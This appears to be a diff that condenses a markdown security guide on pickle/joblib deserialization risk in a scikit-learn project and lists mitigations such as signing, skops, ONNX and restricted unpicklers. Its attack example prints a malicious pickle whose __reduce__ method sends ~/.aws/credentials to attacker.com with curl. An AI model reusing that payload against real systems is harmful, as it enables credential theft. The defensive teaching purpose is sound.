@@ -21,43 +21,25 @@ When you call `pickle.load()` or `joblib.load()`, Python reconstructs objects by
 
 ## Attack Example
 
-### Scenario: Malicious Model File
-
 ```python
-# attacker_creates_malicious_model.py
-import pickle
-import os
-
+# Attacker creates malicious pickle
 class Exploit:
     def __reduce__(self):
-        # This will execute when unpickled!
-        # Example: steal AWS credentials
-        return (os.system, ('curl https://attacker.com?data=$(cat ~/.aws/credentials)',))
+        return (os.system, ('curl attacker.com?data=$(cat ~/.aws/credentials)',))
 
-# Create malicious "model" file
-with open('malicious_model.joblib', 'wb') as f:
-    pickle.dump(Exploit(), f)
+pickle.dump(Exploit(), open('malicious.joblib', 'wb'))
+
+# Victim loads → command executes immediately
+joblib.load('malicious.joblib')  # ← Credentials stolen!
 ```
 
-### What Happens When Loaded
+**Attack Vectors:**
 
-```python
-# victim_code.py
-import joblib
-
-# This will execute the attacker's command!
-model = joblib.load('malicious_model.joblib')  # ← Command executes here
-```
-
-**Result:** The `os.system()` call runs, exfiltrating AWS credentials to the attacker's server.
-
-### Real-World Attack Vectors
-
-1. **User-uploaded models** - If your API accepts model uploads
-2. **Compromised model registry** - If MLflow/S3 bucket is breached
-3. **Supply chain attack** - Malicious model in shared storage
-4. **MITM attack** - Model file intercepted and replaced during download
-5. **Insider threat** - Malicious employee plants backdoored model
+- User-uploaded models
+- Compromised model registry
+- Supply chain attacks
+- Man-in-the-middle (MITM)
+- Insider threats
 
 ---
 
@@ -69,345 +51,142 @@ model = joblib.load('malicious_model.joblib')  # ← Command executes here
 self.model = joblib.load(self.model_path)  # models/iris_classifier.joblib
 ```
 
-### Risk Profile: **LOW** (but not zero)
-
-| Factor | Status | Risk Level |
-|--------|--------|------------|
-| Model source | Locally trained by you | ✅ Low |
-| Path hardcoded | `models/iris_classifier.joblib` | ✅ Low |
-| User input | No user control over path | ✅ Low |
-| Git-tracked | Model is gitignored (not versioned) | ⚠️ Medium |
-| Production use | Not yet deployed | ✅ Low |
-
-### Why This Is (Currently) Acceptable
-
-- **Threat model**: You control the training environment
-- **No external input**: Path is hardcoded, not user-supplied
-- **Learning project**: Not handling sensitive data yet
-
-### When This Becomes HIGH RISK
-
-- ✗ Accepting user-uploaded models
-- ✗ Loading models from URLs/API responses
-- ✗ Downloading models from untrusted sources
-- ✗ Loading models from shared storage without verification
-- ✗ Production deployment with sensitive data
+**Risk Profile: LOW** (not zero)
+**Why Safe Now:** Locally trained | Hardcoded path | No user input | Learning project
+**Becomes HIGH when:** User uploads | URLs | Shared storage | Production deployment
 
 ---
 
 ## Production-Grade Solutions
 
-### Solution 1: Model Signing & Verification (⭐ Recommended for Production)
+### Solution 1: Model Signing & Verification (⭐ Production)
 
-**Concept:** Cryptographically sign model files during training, verify signatures before loading.
-
-```python
-# train_model.py - Sign model after training
-import hmac
-import hashlib
-import json
-
-def sign_model(model_path: str, secret_key: str) -> str:
-    """Create HMAC signature of model file."""
-    with open(model_path, 'rb') as f:
-        model_bytes = f.read()
-
-    signature = hmac.new(
-        secret_key.encode(),
-        model_bytes,
-        hashlib.sha256
-    ).hexdigest()
-
-    return signature
-
-# After training
-model_path = "models/iris_classifier.joblib"
-joblib.dump(model, model_path)
-
-# Sign the model
-SECRET_KEY = os.getenv("MODEL_SIGNING_KEY")  # From AWS Secrets Manager
-signature = sign_model(model_path, SECRET_KEY)
-
-# Save signature
-with open("models/model_signature.json", "w") as f:
-    json.dump({
-        "signature": signature,
-        "algorithm": "HMAC-SHA256",
-        "model_file": "iris_classifier.joblib"
-    }, f)
-```
+**Training:**
 
 ```python
-# app/model.py - Verify before loading
-def verify_and_load_model(model_path: str, signature_path: str, secret_key: str):
-    """Verify model signature before loading."""
-    # Load signature
-    with open(signature_path, 'r') as f:
-        sig_data = json.load(f)
-
-    # Recalculate signature
-    with open(model_path, 'rb') as f:
-        model_bytes = f.read()
-
-    expected_sig = hmac.new(
-        secret_key.encode(),
-        model_bytes,
-        hashlib.sha256
-    ).hexdigest()
-
-    # Verify
-    if not hmac.compare_digest(expected_sig, sig_data["signature"]):
-        raise SecurityError("Model signature verification failed! Possible tampering.")
-
-    # Safe to load
-    return joblib.load(model_path)
+import hmac, hashlib, json
+sig = hmac.new(secret_key.encode(), model_bytes, hashlib.sha256).hexdigest()
+json.dump({"signature": sig, "algorithm": "HMAC-SHA256"}, open("model_sig.json", "w"))
 ```
 
-**Pros:**
+**Loading:**
 
-- ✅ Cryptographically secure
-- ✅ Detects tampering
-- ✅ Industry standard (used by Docker, NPM, etc.)
+```python
+sig_data = json.load(open("model_sig.json"))
+expected = hmac.new(secret_key.encode(), model_bytes, hashlib.sha256).hexdigest()
+if not hmac.compare_digest(expected, sig_data["signature"]):
+    raise SecurityError("Signature mismatch!")
+return joblib.load(model_path)
+```
 
-**Cons:**
-
-- Requires secure key management (AWS Secrets Manager, HashiCorp Vault)
-- Extra overhead during training/loading
+**Pros:** Cryptographically secure ✅ | Detects tampering ✅ | Industry standard ✅
+**Cons:** Requires key management (AWS Secrets Manager) ❌ | Extra overhead ❌
 
 ---
 
 ### Solution 2: Model Registry with Checksums (MLflow)
 
-**Concept:** Use MLflow Model Registry to track model versions and checksums.
+**Training:**
 
 ```python
-# train_model.py
-import mlflow
 import mlflow.sklearn
-
 with mlflow.start_run():
-    # Train model
-    model = train_model()
-
-    # Log to MLflow (auto-generates checksum)
     mlflow.sklearn.log_model(model, "iris_classifier")
-
-    # Register model
-    mlflow.register_model(
-        "runs:/{}/iris_classifier".format(mlflow.active_run().info.run_id),
-        "IrisClassifier"
-    )
+    mlflow.register_model(f"runs:/{mlflow.active_run().info.run_id}/iris_classifier", "IrisClassifier")
 ```
+
+**Loading:**
 
 ```python
-# app/model.py
-import mlflow.sklearn
-
-def load_model_from_registry(model_name: str, version: str):
-    """Load model from MLflow registry (includes checksum verification)."""
-    model_uri = f"models:/{model_name}/{version}"
-
-    # MLflow verifies checksum automatically
-    model = mlflow.sklearn.load_model(model_uri)
-
-    return model
+model = mlflow.sklearn.load_model(f"models:/{model_name}/{version}")  # Auto-verifies checksum
 ```
 
-**Pros:**
-
-- ✅ Built-in checksum verification
-- ✅ Version tracking and lineage
-- ✅ Model governance (stage transitions: Staging → Production)
-
-**Cons:**
-
-- Requires MLflow infrastructure (planned for Phase 3)
-- More complex setup
+**Pros:** Built-in checksum ✅ | Version tracking ✅ | Model governance ✅
+**Cons:** Requires MLflow infrastructure (Phase 3) ❌ | Complex setup ❌
 
 ---
 
 ### Solution 3: Safetensors (Modern Alternative)
-
-**Concept:** Use `safetensors` library - designed specifically to avoid pickle vulnerabilities.
 
 ```bash
 pip install safetensors scikit-learn-safetensors
 ```
 
 ```python
-# train_model.py
-from sklearn_safetensors import save_model
+from safetensors.sklearn import save_model, load_model
 
-model = train_model()
-save_model(model, "models/iris_classifier.safetensors")
+# Training
+save_model(model, "iris_classifier.safetensors")
+
+# Loading
+model = load_model("iris_classifier.safetensors")
 ```
 
-```python
-# app/model.py
-from sklearn_safetensors import load_model
-
-model = load_model("models/iris_classifier.safetensors")
-```
-
-**Pros:**
-
-- ✅ **Cannot execute arbitrary code** (by design)
-- ✅ Faster loading than pickle
-- ✅ Memory-efficient
-
-**Cons:**
-
-- Relatively new (may not support all scikit-learn models)
-- Limited ecosystem compared to pickle/joblib
+**Pros:** Cannot execute code ✅ | Faster than pickle ✅ | Memory-efficient ✅
+**Cons:** Relatively new ❌ | Limited ecosystem ❌
 
 ---
 
 ### Solution 4: ONNX Runtime (Cross-Platform)
 
-**Concept:** Export model to ONNX format (standardized ML format).
-
 ```bash
 pip install skl2onnx onnxruntime
 ```
 
+**Training:**
+
 ```python
-# train_model.py
 from skl2onnx import convert_sklearn
 from skl2onnx.common.data_types import FloatTensorType
-
-initial_type = [('float_input', FloatTensorType([None, 4]))]
-onnx_model = convert_sklearn(model, initial_types=initial_type)
-
-with open("models/iris_classifier.onnx", "wb") as f:
-    f.write(onnx_model.SerializeToString())
+onnx_model = convert_sklearn(model, initial_types=[('float_input', FloatTensorType([None, 4]))])
+open("iris_classifier.onnx", "wb").write(onnx_model.SerializeToString())
 ```
+
+**Loading:**
 
 ```python
-# app/model.py
 import onnxruntime as rt
-
-sess = rt.InferenceSession("models/iris_classifier.onnx")
-input_name = sess.get_inputs()[0].name
-pred = sess.run(None, {input_name: features})
+sess = rt.InferenceSession("iris_classifier.onnx")
+pred = sess.run(None, {sess.get_inputs()[0].name: features})
 ```
 
-**Pros:**
-
-- ✅ **Cannot execute arbitrary code**
-- ✅ Cross-platform (Python, C++, JavaScript)
-- ✅ Production-grade (used by Microsoft, Facebook)
-- ✅ Optimized for inference
-
-**Cons:**
-
-- Extra conversion step
-- Not all models convert perfectly
+**Pros:** Cannot execute code ✅ | Cross-platform ✅ | Production-grade (MSFT/FB) ✅ | Optimized ✅
+**Cons:** Conversion step ❌ | Not all models convert perfectly ❌
 
 ---
 
-### Solution 5: skops.io (Recommended for scikit-learn Models) ⭐
-
-**Concept:** Use `skops` library - official scikit-learn recommendation for pickle-free serialization.
+### Solution 5: skops.io (⭐ Recommended for scikit-learn)
 
 ```bash
 pip install skops>=0.13.0
 ```
 
-```python
-# train_model.py
-import skops.io as sio
-from sklearn.ensemble import RandomForestClassifier
+**Training:** `sio.dump(model, "iris_classifier.skops")`
+**Loading:** `model = sio.load("iris_classifier.skops", trusted=True)`
 
-model = train_model()
-sio.dump(model, "models/iris_classifier.skops")
-```
+**Pros:** Cannot execute code ✅ | Official sklearn recommendation ✅ | Drop-in replacement ✅ | Python 3.13 compatible ✅
+**Cons:** Pre-1.0 (API may change) ⚠️ | No native MLflow support ⚠️
 
-```python
-# app/model.py
-import skops.io as sio
-
-# Option 1: Trusted mode (for locally trained models)
-model = sio.load("models/iris_classifier.skops", trusted=True)
-
-# Option 2: Explicit type allowlist (production recommended)
-model = sio.load(
-    "models/iris_classifier.skops",
-    trusted=["sklearn.ensemble._forest.RandomForestClassifier", "numpy.ndarray"]
-)
-```
-
-**Pros:**
-
-- ✅ **Cannot execute arbitrary code** (by design - no pickle)
-- ✅ Official scikit-learn recommendation (v0.13.0+)
-- ✅ Drop-in replacement for joblib (minimal code changes)
-- ✅ Supports all scikit-learn estimators
-- ✅ Compatible with Python 3.13 + scikit-learn 1.6.1
-- ✅ Active development and community support
-
-**Cons:**
-
-- ⚠️ Pre-1.0 version (API may change)
-- ⚠️ No native MLflow support (requires custom PyFunc wrapper)
-- ⚠️ Newer library (less battle-tested than joblib)
-
-**When to Use:**
-
-- ✅ Immediate CWE-502 remediation needed
-- ✅ scikit-learn models (RandomForest, SVM, etc.)
-- ✅ Want minimal code changes from joblib
-- ✅ Can tolerate pre-1.0 API changes
-- ⚠️ MLflow integration requires custom wrapper (Phase 3 planning)
+**When to Use:** Immediate CWE-502 fix | scikit-learn models | Minimal code changes | Phase 3 MLflow requires custom wrapper
 
 ---
 
 ### Solution 6: Restricted Unpickler (Allowlist)
 
-**Concept:** Create a custom unpickler that only allows safe classes.
-
 ```python
-# app/model.py
-import pickle
-import io
-from sklearn.ensemble import RandomForestClassifier
-from sklearn.preprocessing import StandardScaler
-
 class SafeUnpickler(pickle.Unpickler):
-    """Only allow specific safe classes to be unpickled."""
-
-    ALLOWED_CLASSES = {
-        ('sklearn.ensemble._forest', 'RandomForestClassifier'),
-        ('sklearn.tree._classes', 'DecisionTreeClassifier'),
-        ('numpy', 'ndarray'),
-        ('numpy.core.multiarray', '_reconstruct'),
-        # Add other safe classes as needed
-    }
+    ALLOWED_CLASSES = {('sklearn.ensemble._forest', 'RandomForestClassifier'), ('numpy', 'ndarray')}
 
     def find_class(self, module, name):
         if (module, name) not in self.ALLOWED_CLASSES:
-            raise pickle.UnpicklingError(
-                f"Attempted to load disallowed class: {module}.{name}"
-            )
+            raise pickle.UnpicklingError(f"Disallowed class: {module}.{name}")
         return super().find_class(module, name)
 
-def safe_joblib_load(filepath: str):
-    """Load joblib file with restricted unpickler."""
-    with open(filepath, 'rb') as f:
-        return SafeUnpickler(f).load()
-
-# Usage
-model = safe_joblib_load("models/iris_classifier.joblib")
+model = SafeUnpickler(open(filepath, 'rb')).load()
 ```
 
-**Pros:**
-
-- ✅ Works with existing pickle files
-- ✅ No training code changes
-
-**Cons:**
-
-- ⚠️ Requires maintaining allowlist
-- ⚠️ Still uses pickle (not foolproof)
+**Pros:** Works with existing files ✅ | No training changes ✅
+**Cons:** Maintain allowlist ⚠️ | Still uses pickle (not foolproof) ⚠️
 
 ---
 
@@ -426,115 +205,68 @@ model = safe_joblib_load("models/iris_classifier.joblib")
 
 ## Recommended Implementation Roadmap
 
-### Phase 1 (Now) - Low-Risk Learning Environment
+### Phase 1 (Now) - Low-Risk Learning
 
-#### Option A: Document the decision (Fastest)
+#### Option A: Document
 
 ```python
-# app/model.py:42
-# Security Note: Using joblib.load() with locally trained model
-# Model source: train_model.py (controlled environment)
-# Risk: Low (no user input, hardcoded path)
-# Production: Will migrate to MLflow/ONNX (Phase 3)
+# Security Note: joblib.load() with locally trained model (controlled environment, low risk)
+# Production: Migrate to MLflow/ONNX (Phase 3)
 self.model = joblib.load(self.model_path)  # nosemgrep: unsafe-pickle-deserialization
 ```
 
-#### Option B: Add basic hash verification (Best for learning)
+#### Option B: Hash Verification (Learning Exercise)
 
 ```python
 # train_model.py
-import hashlib
-
-def hash_file(filepath: str) -> str:
-    """Calculate SHA-256 hash of file."""
-    sha256 = hashlib.sha256()
-    with open(filepath, 'rb') as f:
-        for chunk in iter(lambda: f.read(4096), b''):
-            sha256.update(chunk)
-    return sha256.hexdigest()
-
-# After saving model
-model_hash = hash_file("models/iris_classifier.joblib")
+model_hash = hashlib.sha256(open(filepath, 'rb').read()).hexdigest()
 metadata["model_hash"] = model_hash
-metadata["model_file"] = "iris_classifier.joblib"
-```
 
-```python
 # app/model.py
-def load(self) -> None:
-    """Load and verify model."""
-    # Verify hash
-    expected_hash = self.metadata.get("model_hash")
-    if expected_hash:
-        actual_hash = self._hash_file(self.model_path)
-        if actual_hash != expected_hash:
-            raise SecurityError(
-                f"Model file hash mismatch! "
-                f"Expected: {expected_hash}, Got: {actual_hash}"
-            )
-
-    # Safe to load
-    self.model = joblib.load(self.model_path)
+if hashlib.sha256(open(path, 'rb').read()).hexdigest() != metadata["model_hash"]:
+    raise SecurityError("Model hash mismatch!")
 ```
 
-### Phase 2-3 (Infrastructure) - Production Preparation
+### Phase 2-3 (Infrastructure)
 
-**Migrate to MLflow with model signing:**
+MLflow Registry + HMAC signing + AWS Secrets Manager + versioning + stage transitions
 
-- Set up MLflow Model Registry (already planned)
-- Implement HMAC signing with AWS Secrets Manager
-- Add model versioning and stage transitions
+### Phase 4+ (Production)
 
-### Phase 4+ (Production) - Multiple Layers
-
-**Defense in depth:**
-
-1. MLflow Registry (checksum verification)
-2. Model signing (HMAC or digital signatures)
-3. Network isolation (models only from VPC endpoints)
-4. Audit logging (who accessed which model when)
-5. Consider ONNX for inference optimization
+**Defense in depth:** MLflow (checksum) | Model signing (HMAC) | Network isolation (VPC) | Audit logging | ONNX
 
 ---
 
-## Immediate Action Items
+## Immediate Actions
 
-### 1. Add Documentation (5 min)
-
-Document why current usage is acceptable and future plans.
-
-### 2. Add Hash Verification (30 min)
-
-Implement basic SHA-256 hash checking as a learning exercise.
-
-### 3. Create Issue for Phase 3 (5 min)
-
-Track migration to MLflow/ONNX in your project board.
-
-### 4. Update CLAUDE.md (10 min)
-
-Add security decision to project docs.
+- [ ] **Document decision** (5min) - Add security note explaining joblib usage acceptable for learning
+- [ ] **Hash verification** (30min) - Implement SHA-256 check as learning exercise
+- [ ] **Create issue** (5min) - Track Phase 3 MLflow/ONNX migration
+- [ ] **Update CLAUDE.md** (10min) - Document security approach
 
 ---
 
 ## Further Reading
 
-- [OWASP: Deserialization of Untrusted Data](https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data)
-- [Python Pickle Documentation Warning](https://docs.python.org/3/library/pickle.html#module-pickle)
-- [MLflow Model Registry Best Practices](https://mlflow.org/docs/latest/model-registry.html)
-- [Safetensors Security Design](https://github.com/huggingface/safetensors#security)
-- [ONNX Model Zoo](https://github.com/onnx/models)
-
----
+- [OWASP: Deserialization of Untrusted Data][owasp]
+- [Python Pickle Documentation Warning][pickle-docs]
+- [MLflow Model Registry Best Practices][mlflow]
+- [Safetensors Security Design][safetensors]
+- [ONNX Model Zoo][onnx]
 
 ## Questions to Consider
 
-1. **Threat model**: Who are your potential attackers? (Curious users? Competitors? Nation-states?)
-2. **Data sensitivity**: What happens if model is compromised? (Embarrassing? Revenue loss? Lives at risk?)
+1. **Threat model**: Who are potential attackers? (Curious users? Competitors? Nation-states?)
+2. **Data sensitivity**: What if model is compromised? (Embarrassing? Revenue loss? Lives at risk?)
 3. **Deployment timeline**: When will this hit production? (Determines urgency)
 4. **Team skills**: Comfortable managing crypto keys? (Affects solution choice)
 5. **Infrastructure**: MLflow/model registry already planned? (Leverage existing plans)
 
-For a **learning project**: Option B (hash verification) teaches good habits without over-engineering.
+**For learning:** Hash verification (Option B) teaches good habits without over-engineering.
+**For production:** MLflow + model signing + ONNX (defense in depth).
 
-For **production**: MLflow + model signing + ONNX (defense in depth).
+[owasp]: https://owasp.org/www-community/vulnerabilities/Deserialization_of_untrusted_data
+[pickle-docs]: https://docs.python.org/3/library/pickle.html#module-pickle
+[mlflow]: https://mlflow.org/docs/latest/model-registry.html
+[safetensors]: https://github.com/huggingface/safetensors#security
+[onnx]: https://github.com/onnx/models
